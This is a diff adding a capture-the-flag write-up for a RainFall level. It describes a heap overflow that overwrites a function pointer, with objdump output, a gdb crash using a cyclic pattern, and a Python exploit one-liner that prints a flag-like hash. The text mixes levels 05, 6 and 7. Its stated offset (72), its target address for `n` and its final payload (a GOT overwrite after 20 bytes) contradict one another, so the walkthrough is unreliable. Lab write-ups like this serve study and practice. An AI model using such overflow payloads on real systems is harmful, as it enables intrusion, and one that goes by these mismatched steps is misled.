@@ -1,0 +1,42 @@
+# Level 05
+
+## Analysis
+
+We started by checking the file binary with objdump and found the following stuff:
+```bash
+level7@RainFall:~$ objdump -R level7
+
+level7:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049904 R_386_GLOB_DAT    __gmon_start__
+08049914 R_386_JUMP_SLOT   printf
+08049918 R_386_JUMP_SLOT   fgets
+0804991c R_386_JUMP_SLOT   time
+08049920 R_386_JUMP_SLOT   strcpy
+08049924 R_386_JUMP_SLOT   malloc
+08049928 R_386_JUMP_SLOT   puts
+0804992c R_386_JUMP_SLOT   __gmon_start__
+08049930 R_386_JUMP_SLOT   __libc_start_main
+08049934 R_386_JUMP_SLOT   fopen
+```
+
+There is two functions `m` and `n`. After decompile it on ghidra we saw that `n` was never call. We read main function and we undestood that there is two variable on the heap. One them is pointer of function, which is call after doing a strcpy. We directly thinking about the overflow on strcpy to override the content pointed by the pointer of function. We simply made mask using (https://wiremask.eu/tools/buffer-overflow-pattern-generator/) test the poadding between those 2 variables (another way also do to verify this value is to use gdb).
+
+```bash
+(gdb) r "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
+Starting program: /home/user/level6/level6 "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41346341 in ?? ()
+```
+
+So the offset is 72, so after copying 72, we can override the content pointed by the pointer of function. By reading the output of objdump, we know that `n` address is `08048454`.
+We have everything to build the payload:
+
+```bash
+level7@RainFall:~$ ./level7 $(python -c 'import struct; print 20*"A" + struct.pack("I", 0x08049928)') $(python -c 'import struct; print struct.pack("I", 0x080484f4)')
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1708137318
+```
